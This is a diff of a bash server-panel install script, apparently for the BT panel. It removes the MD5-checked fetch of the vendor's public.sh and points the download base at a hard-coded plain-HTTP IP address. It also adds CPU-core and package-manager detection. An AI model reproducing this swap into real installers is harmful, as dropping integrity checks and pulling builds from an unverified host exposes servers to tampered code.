@@ -1,17 +1,8 @@
 #!/bin/bash
 PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
 export PATH
-public_file=/www/server/panel/install/public.sh
-if [ ! -f $public_file ];then
-	wget -O $public_file http://download.bt.cn/install/public.sh -T 30;
-fi
-publicFileMd5=$(md5sum ${public_file}|awk '{print $1}')
-md5check="3359a1a55d242faad48bc196eed9a876"
-if [ "${publicFileMd5}" != "${md5check}"  ]; then
-	wget -O $public_file http://download.bt.cn/install/public.sh -T 30;
-fi
-. $public_file
-download_Url=$NODE_URL
+
+download_Url='http://128.1.164.196:5880'
 mkdir -p /www/server
 run_path="/root"
 Is_64bit=`getconf LONG_BIT`
@@ -258,6 +249,39 @@ Install_Lib()
 
 }
 
+GetCpuStat(){
+        time1=$(cat /proc/stat |grep 'cpu ')
+        sleep 1
+        time2=$(cat /proc/stat |grep 'cpu ')
+        cpuTime1=$(echo ${time1}|awk '{print $2+$3+$4+$5+$6+$7+$8}')
+        cpuTime2=$(echo ${time2}|awk '{print $2+$3+$4+$5+$6+$7+$8}')
+        runTime=$((${cpuTime2}-${cpuTime1}))
+        idelTime1=$(echo ${time1}|awk '{print $5}')
+        idelTime2=$(echo ${time2}|awk '{print $5}')
+        idelTime=$((${idelTime2}-${idelTime1}))
+        useTime=$(((${runTime}-${idelTime})*3))
+        [ ${useTime} -gt ${runTime} ] && cpuBusy="true"
+        if [ "${cpuBusy}" == "true" ]; then
+                cpuCore=$((${cpuInfo}/2))
+        else
+                cpuCore=$((${cpuInfo}-1))
+        fi
+}
+GetPackManager(){
+        if [ -f "/usr/bin/yum" ] && [ -f "/etc/yum.conf" ]; then
+                PM="yum"
+        elif [ -f "/usr/bin/apt-get" ] && [ -f "/usr/bin/dpkg" ]; then
+                PM="apt-get"            
+        fi
+}
+cpuInfo=$(getconf _NPROCESSORS_ONLN)
+if [ "${cpuInfo}" -ge "4" ];then
+        GetCpuStat
+else
+        cpuCore="1"
+fi
+
+GetPackManager
 Install_Lib
 Install_Openssl
 Install_Pcre
